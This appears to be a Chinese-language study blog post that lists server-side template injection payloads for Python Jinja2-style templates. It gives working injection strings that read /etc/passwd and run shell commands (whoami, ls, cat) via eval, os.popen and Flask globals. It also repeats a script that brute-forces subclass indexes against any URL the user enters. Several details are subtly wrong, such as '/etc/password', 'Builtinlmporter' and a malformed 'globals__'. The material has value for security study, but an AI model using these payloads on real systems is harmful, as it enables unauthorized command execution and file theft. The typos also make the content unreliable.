---
title: SSTI常用模块
categories:
  - 学习
tags:
  - SSTI
abbrlink: cfc73fcd
---

### 常用注入模块

1. 文件读取
2. 内建函数eval执行命令
3. os模块执行命令
4. importlib类执行命令
5. linecache函数执行命令
6. subproces.Popen类执行命令

### 文件读取

查找子类`_frozen_importlib_external.FileLoader`

#### 查看文件读取函数

脚本

```python
import requests

# 获取用户输入的URL地址
url = input('请输入URL链接:')

# 循环500次进行请求
for i in range(500):
    # name根据提交的内容修改
    # <input type="text" name="name" value=""> 这里根据""内的内容修改
    data = {"name": "{{().__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
    try:
        # 发送POST请求
        response = requests.post(url, data=data)
        # 检查响应状态码是否为200
        if response.status_code == 200:
            # 检查响应文本中是否包含特定字符串
            if '_frozen_importlib_external.FileLoader' in response.text:
                print(response.text)
                print(i)
    except requests.RequestException as e:
        # 处理请求过程中可能出现的异常
        print(f"请求出错: {e}")
```

#### `FileLoader`的利用

```python
{{''.__class__.__base__.__subclasses__()[114]["get_data"](0（参数）,"/etc/password"（文件路径）)}}
```

### 内建函数eval执行命令

#### 查看`eval`函数的位置

脚本

```python
import requests

# 获取用户输入的URL地址
url = input('请输入URL链接:')

# 循环500次进行请求
for i in range(500):
    # name根据提交的内容修改
    # <input type="text" name="name" value=""> 这里根据""内的内容修改
    data = {"name": "{{().__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__['__builtins__']}}"}
    try:
        # 发送POST请求
        response = requests.post(url, data=data)
        # 检查响应状态码是否为200
        if response.status_code == 200:
            # 检查响应文本中是否包含特定字符串
            if 'eval' in response.text:
                print(response.text)
                print(i)
    except requests.RequestException as e:
        # 处理请求过程中可能出现的异常
        print(f"请求出错: {e}")
```

#### 利用

```python
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')}}
```

### os模块执行命令

1. 在其他函数中直接调用os模块

```python
#通过config调用os
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
#通过url_for
{{url_for.__globals__.os.popen('whoami').read()}}
```

2. 在已经加载os模块的子类里直接调用os模块

```python
{{''.__class__.__bases__[0].__subclasses__()[114].__init__.globals__['os'].popen("ls").read()}}
```



#### 查看已经加载`os.py`模块

```python
import requests

# 获取用户输入的URL地址
url = input('请输入URL链接:')

# 循环500次进行请求
for i in range(500):
    # name根据提交的内容修改
    # <input type="text" name="name" value=""> 这里根据""内的内容修改
    data = {"name": "{{().__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__}}"}
    try:
        # 发送POST请求
        response = requests.post(url, data=data)
        # 检查响应状态码是否为200
        if response.status_code == 200:
            # 检查响应文本中是否包含特定字符串
            if 'os.py' in response.text:
                print(response.text)
                print(i)
    except requests.RequestException as e:
        # 处理请求过程中可能出现的异常
        print(f"请求出错: {e}")
```

~~剩下用的不多~~

### `importlib`类执行命令

**作用：**可以加载第三方库，使用`load_module`加载os

#### 查找`_frozen_importlib.Builtinlmporter`

```python
import requests

# 获取用户输入的URL地址
url = input('请输入URL链接:')

# 循环500次进行请求
for i in range(500):
    # name根据提交的内容修改
    # <input type="text" name="name" value=""> 这里根据""内的内容修改
    data = {"name": "{{().__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
    try:
        # 发送POST请求
        response = requests.post(url, data=data)
        # 检查响应状态码是否为200
        if response.status_code == 200:
            # 检查响应文本中是否包含特定字符串
            if '_frozen_importlib.Builtinlmporter' in response.text:
                print(response.text)
                print(i)
    except requests.RequestException as e:
        # 处理请求过程中可能出现的异常
        print(f"请求出错: {e}")
```

